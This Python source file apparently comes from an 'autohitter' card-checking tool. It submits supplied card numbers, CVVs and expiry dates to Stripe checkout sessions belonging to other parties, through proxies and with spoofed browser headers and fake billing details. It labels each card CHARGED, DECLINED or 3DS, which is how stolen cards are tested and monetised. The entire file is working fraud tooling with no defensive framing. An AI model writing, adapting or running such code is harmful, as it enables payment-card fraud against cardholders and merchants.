# -*- coding: utf-8 -*-
"""Stripe checkout init + charge (from autohitter + extensions)."""
import time
import aiohttp

HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
}

_session = None

async def get_session():
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
            timeout=aiohttp.ClientTimeout(total=25, connect=8),
        )
    return _session

async def init_checkout(pk: str, cs: str) -> dict:
    s = await get_session()
    body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
    async with s.post(
        f"https://api.stripe.com/v1/payment_pages/{cs}/init",
        headers=HEADERS,
        data=body,
    ) as r:
        return await r.json()

async def charge_card_fast(
    card: dict, pk: str, cs: str, init_data: dict, proxy_url: str | None = None
) -> dict:
    start = time.perf_counter()
    result = {
        "card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}",
        "status": None,
        "response": None,
        "time": 0,
    }
    try:
        s = await get_session()
        email = init_data.get("customer_email") or "john@example.com"
        checksum = init_data.get("init_checksum", "")
        lig = init_data.get("line_item_group")
        inv = init_data.get("invoice")
        if lig:
            total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
        elif inv:
            total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
        else:
            pi = init_data.get("payment_intent") or {}
            total = subtotal = pi.get("amount", 0)
        cust = init_data.get("customer") or {}
        addr = cust.get("address") or {}
        name = cust.get("name") or "John Smith"
        country = addr.get("country") or "US"
        line1 = addr.get("line1") or "476 West White Mountain Blvd"
        city = addr.get("city") or "Pinetop"
        state = addr.get("state") or "AZ"
        zip_code = addr.get("postal_code") or "85929"
        pm_body = (
            f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
            f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
            f"&billing_details[name]={name}&billing_details[email]={email}"
            f"&billing_details[address][country]={country}"
            f"&billing_details[address][line1]={line1}"
            f"&billing_details[address][city]={city}"
            f"&billing_details[address][postal_code]={zip_code}"
            f"&billing_details[address][state]={state}&key={pk}"
        )
        async with s.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=HEADERS,
            data=pm_body,
            proxy=proxy_url,
        ) as r:
            pm = await r.json()
        if "error" in pm:
            result["status"] = "DECLINED"
            result["response"] = pm["error"].get("message", "Card error")[:60]
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        pm_id = pm.get("id")
        if not pm_id:
            result["status"] = "FAILED"
            result["response"] = "No PM"
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        conf_body = (
            f"eid=NA&payment_method={pm_id}&expected_amount={total}"
            f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
            f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
            f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
            f"&last_displayed_line_item_group_details[total_discount_amount]=0"
            f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
            f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
        )
        async with s.post(
            f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
            headers=HEADERS,
            data=conf_body,
            proxy=proxy_url,
        ) as r:
            conf = await r.json()
        if "error" in conf:
            err = conf["error"]
            dc = err.get("decline_code", "")
            msg = err.get("message", "Failed")
            result["status"] = "DECLINED"
            result["response"] = f"{dc.upper()}: {msg}" if dc else msg
        else:
            pi = conf.get("payment_intent") or {}
            st = pi.get("status", "") or conf.get("status", "")
            if st == "succeeded":
                result["status"] = "CHARGED"
                result["response"] = "Charged"
            elif st == "requires_action":
                result["status"] = "3DS"
                result["response"] = "3DS Required"
            elif st == "requires_payment_method":
                result["status"] = "DECLINED"
                result["response"] = "Declined"
            else:
                result["status"] = "UNKNOWN"
                result["response"] = st or "Unknown"
    except Exception as e:
        result["status"] = "ERROR"
        result["response"] = str(e)[:40]
    result["time"] = round(time.perf_counter() - start, 2)
    return result

async def charge_card(
    card: dict, checkout_data: dict, proxy_url: str | None = None
) -> dict:
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    if not pk or not cs or not init_data:
        return {
            "card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}",
            "status": "FAILED",
            "response": "No PK/CS",
            "time": 0,
        }
    return await charge_card_fast(card, pk, cs, init_data, proxy_url)
